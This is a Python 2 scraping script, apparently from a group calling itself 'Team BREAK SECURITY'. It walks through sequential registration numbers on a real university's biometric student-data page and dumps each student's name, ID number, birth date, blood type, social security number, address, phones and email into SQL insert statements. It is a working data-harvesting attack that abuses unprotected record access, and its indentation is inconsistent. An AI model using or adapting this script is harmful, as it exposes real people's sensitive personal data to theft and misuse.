# -*- coding: utf-8 -*-
__author__ = 'H4RSH4D'
from bs4 import BeautifulSoup
import requests

base=raw_input("Nombre del sql= ")
archi=open (base+'.sql','w')
archi.close()
#creando el archivo sql
 
   


print('================================================================================')
print('=--------------------------- Comenzando la captura ----------------------------=')
print('=---------------------------- Team: BREAK SECURITY  ---------------------------=')
print('================================================================================')
def comenzar(URL):
    
	print(URL)
	# Realizamos la petición a la web
	req = requests.get(URL)
	print(req)
	status_code = req.status_code
	if status_code == 200:
		# Pasamos el contenido HTML de la web a un objeto BeautifulSoup()
		html = BeautifulSoup(req.text, "html.parser")
     	 
    	# Obtenemos todos los divs donde están las entradas
		entradas = html.find_all('div')
		for entrada in entradas:
      	#print(titulo)
				if (entrada.find('span',{'id': 'lbl_Carr'}))!=None: 
      					carrera = entrada.find('span',{'id': 'lbl_Carr'}).getText() 	
       					#print(carrera)
       					nombre = entrada.find('span', {'id': 'lbl_Nombre'}).getText()
        				#print(nombre)
        				registro = entrada.find('span', {'id': 'lbl_Reg'}).getText()
        				#print(registro)
        				carnet=entrada.find('span', {'id': 'lbl_CI'}).getText()
        				#print(carnet)
        				fecha_naci=entrada.find('span', {'id': 'lbl_FechaNac'}).getText()
        				#print(fecha_naci)
        				sexo=entrada.find('span', {'id': 'lbl_Sexo'}).getText()
        				#print(sexo)
        				estado_civi=entrada.find('span', {'id': 'lbl_EstadoCivil'}).getText()
        				#print(estado_civi)
        				pais=entrada.find('span', {'id': 'lbl_Pais'}).getText()
        				#print(pais)
        				dpto=entrada.find('span', {'id': 'lbl_Dpto'}).getText()
        				#print(dpto)
        				provincia=entrada.find('span', {'id': 'lbl_Prov'}).getText()
        				#print(provincia)
        				nacionalidad=entrada.find('span', {'id': 'lbl_Nacionalidad'}).getText()
        				#print(nacionalidad)
        				tiposangre=entrada.find('span', {'id': 'lbl_TipoSangre'}).getText()
        				#print(tiposangre)
        				segurosocial=entrada.find('span', {'id': 'lbl_SeguroSocial'}).getText()
        				#print(segurosocial)
        				nroseguro=entrada.find('span', {'id': 'lbl_NroSeguro'}).getText()
        				#print(nroseguro)
        				dirrecion=entrada.find('span', {'id': 'lbl_Direccion'}).getText()
        				#print(dirrecion)
        				telefono_fijo=entrada.find('span', {'id': 'lbl_Telef'}).getText()
        				#print(telefono_fijo)
        				telefono_celular=entrada.find('span', {'id': 'lbl_Celular'}).getText()
        				#print(telefono_celular)
        				correo=entrada.find('span', {'id': 'lbl_Mail'}).getText()
        				#print(correo)
        				titulo_bachiller=entrada.find('span', {'id': 'lbl_TituloBach'}).getText()
        				#print(titulo_bachiller)
        				ano_titulo_bachiller=entrada.find('span', {'id': 'lbl_AnoTit'}).getText()
        				#print(ano_titulo_bachiller)
        				emision_titulo=entrada.find('span', {'id': 'lbl_UnivEmisionTit'}).getText()
        				#print(emision_titulo)
        				if carrera!='':
        				   archi=open(base+'.sql','a')
        				   carr="' "+carrera+" '"
        				   nomb="' "+nombre+" '"
        				   cart="' "+carnet+" '"
        				   fech="' "+fecha_naci+" '"
        				   sex="' "+sexo+" '"
        				   est_civ="' "+estado_civi+" '"
        				   pai="' "+pais+" '"
        				   depa="' "+dpto+" '"
        				   provi="' "+provincia+" '"
        				   naci="' "+nacionalidad+" '"
        				   sangre="' "+tiposangre+" '"
        				   nrsegu="' "+segurosocial+" '"
        				   dire="' "+dirrecion+" '"
        				   corr="' "+correo+" '"
        				   emis="' "+emision_titulo+" '"

       					   archi.write('INSERT INTO  ALUMNO VALUES ( '+carr+','+nomb+
       					   										   ','+registro+','+cart+
       					   										   ','+ fech+',' +sex+
       					   										   ','+est_civ+','+pai+
       					   										   ','+depa+','+provi+
       					   										   ','+naci+','+sangre+
       					   										   ','+nrsegu+','+dire+
       					   										   ','+telefono_fijo+telefono_celular+
       					   										   ','+corr+titulo_bachiller+ano_titulo_bachiller+
       					   										   ','+emis+')  \n')
        				   print(carrera)
       					   print(nombre)
       					   print(registro)
        			   	   print(carnet)      				 
        				   print(fecha_naci)        				 
        				   print(sexo)        				 
        				   print(estado_civi)        				 
        				   print(pais)       				 
        				   print(dpto)        				 
        				   print(provincia)        				 
        				   print(nacionalidad)
        				   print(tiposangre)        				 
        				   print(segurosocial)        				 
        				   print(nroseguro)        				 
        				   print(dirrecion)        				 
        				   print(telefono_fijo)
        				   print(telefono_celular)
        				   print(correo)
        				   print(titulo_bachiller)
        				   print(ano_titulo_bachiller)
        				   print(emision_titulo)
        				   archi.close()
       					else:
       					   print('REGISTRO VACIO') 
  	   			else:
        		  	    print('----------------------------------------------------------------')
	else:
  		print("Tiempo de espera agotado, volviendo a intentar")
for x in range(210205792,210205799):
	URL = 'http://academico.uagrm.edu.bo/biometrico/datosest/wbiometrico.aspx?reg='+ str(x)
	comenzar(URL)
 
print('===============================================================================')
print('=--------------------------- Fin del programa --------------------------------=')
print('=------------------------- Team BREAK SECURITY -------------------------------=')
print('===============================================================================')